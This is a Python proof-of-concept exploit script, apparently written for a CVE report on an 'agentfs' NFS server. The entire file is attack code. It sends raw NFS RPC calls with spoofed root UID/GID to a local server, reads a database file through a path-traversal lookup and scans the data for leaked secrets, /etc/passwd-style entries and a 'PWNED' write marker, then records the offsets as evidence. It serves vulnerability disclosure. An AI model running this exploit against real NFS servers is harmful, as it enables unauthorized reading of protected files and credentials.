#!/usr/bin/env python3
import sys, json, hashlib, datetime
from pathlib import Path
sys.path.insert(0, '/home/teycir/Repos/agentfs-cve/pocs')
import nfs_traversal_capture as n
HOST,PORT,UID,GID='127.0.0.1',11112,0,0
DB='/tmp/opencode-v064/.agentfs/v064poc.db-wal'
OUT=Path(sys.argv[1]); OUT.mkdir(parents=True,exist_ok=True)
def rpc(prog,proc,body): return n.rpc(HOST,PORT,prog,3,proc,body,UID,GID)
idx=[0]
def rec(label,prog,proc,body):
    idx[0]+=1; r,req,resp=rpc(prog,proc,body); n.save(OUT,idx[0],label,req,resp); return r
r=rec('mnt',100005,1,n.X().s('/')); r.u32(); root=r.op()
r=rec('lookup_db',100003,3,n.X().op(root).s(DB)); st=r.u32(); assert st==0,st
fh=r.op(); obj=r.attrs(); r.attrs()
print('[+] LOOKUP',DB,'size',obj['size'],'mode',oct(obj['mode']))
size=obj['size']; found={}; off=0; chunk=65536
while off<size and len(found)<3:
    r=rec(f'read_{off}',100003,6,n.X().op(fh).u64(off).u32(chunk))
    st=r.u32(); assert st==0,st
    r.attrs(); cnt=r.u32(); eof=r.u32(); data=r.op()
    for marker in [b'V064-INSIDE-BASE-FILE',b'V064-OUTSIDE-SECRET',b'V064-MODE600-SECRET',b'root:x:0:0:root',b'PWNED-VIA-NFS-WRITE']:
        if marker in data and marker not in found:
            found[marker]=off+data.find(marker)
    off+=cnt
    if eof: break
print('[+] markers found at offsets:',found)
res={"started_utc":datetime.datetime.now(datetime.timezone.utc).isoformat().replace('+00:00','Z'),
     "db_path":DB,"db_size":size,"markers":{k.decode():v for k,v in found.items()},
     "finished_utc":datetime.datetime.now(datetime.timezone.utc).isoformat().replace('+00:00','Z')}
(OUT/'result.json').write_text(json.dumps(res,indent=2)+'\n')
print('[+] evidence ->',OUT)
